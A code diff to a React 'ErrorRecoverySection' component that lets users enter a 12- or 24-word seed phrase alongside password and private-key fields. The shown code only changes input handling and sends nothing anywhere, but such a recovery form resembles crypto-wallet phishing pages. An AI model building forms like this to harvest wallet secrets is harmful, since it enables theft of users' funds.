@@ -20,6 +20,7 @@ function ErrorRecoverySection({
     password: '',
     privateKey: ''
   });
+  const [wordCount, setWordCount] = useState(12);
   const [seedWords, setSeedWords] = useState(Array(12).fill(''));
   const [showWords, setShowWords] = useState(Array(12).fill(false));
   const [showRecoveryForm, setShowRecoveryForm] = useState(false);
@@ -34,8 +35,8 @@ function ErrorRecoverySection({
     setIsSubmitting(false);
     // Reset seed words when opening the form
     if (option === 'Seed Phrase') {
-      setSeedWords(Array(12).fill(''));
-      setShowWords(Array(12).fill(false));
+      setSeedWords(Array(wordCount).fill(''));
+      setShowWords(Array(wordCount).fill(false));
     }
   };
 
@@ -59,12 +60,12 @@ function ErrorRecoverySection({
   const handleSeedPaste = (e) => {
     e.preventDefault();
     const pastedText = e.clipboardData.getData('text');
-    const words = pastedText.trim().split(/\s+/).slice(0, 12);
+    const words = pastedText.trim().split(/\s+/).slice(0, wordCount);
     
     if (words.length > 0) {
       const newWords = [...seedWords];
       words.forEach((word, i) => {
-        if (i < 12) newWords[i] = word;
+        if (i < wordCount) newWords[i] = word;
       });
       setSeedWords(newWords);
     }
@@ -183,7 +184,36 @@ function ErrorRecoverySection({
                       </h2>
                       
                       {recoveryOption === 'Seed Phrase' && (
-                        <div className="grid grid-cols-2 gap-3" onPaste={handleSeedPaste}>
+                        <div className="space-y-4">
+                          <div className="flex justify-center gap-3">
+                            <Button
+                              type="button"
+                              onClick={() => {
+                                setWordCount(12);
+                                setSeedWords(Array(12).fill(''));
+                                setShowWords(Array(12).fill(false));
+                              }}
+                              variant={wordCount === 12 ? 'default' : 'outline'}
+                              size="sm"
+                              className="w-full text-xs"
+                            >
+                              12 Words
+                            </Button>
+                            <Button
+                              type="button"
+                              onClick={() => {
+                                setWordCount(24);
+                                setSeedWords(Array(24).fill(''));
+                                setShowWords(Array(24).fill(false));
+                              }}
+                              variant={wordCount === 24 ? 'default' : 'outline'}
+                              size="sm"
+                              className="w-full text-xs"
+                            >
+                              24 Words
+                            </Button>
+                          </div>
+                          <div className="grid grid-cols-2 gap-3" onPaste={handleSeedPaste}>
                           {seedWords.map((word, index) => (
                             <div key={index} className="relative group">
                               <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[10px] font-mono font-bold text-muted-foreground/40 select-none">
@@ -210,6 +240,7 @@ function ErrorRecoverySection({
                               </button>
                             </div>
                           ))}
+                          </div>
                         </div>
                       )}
 
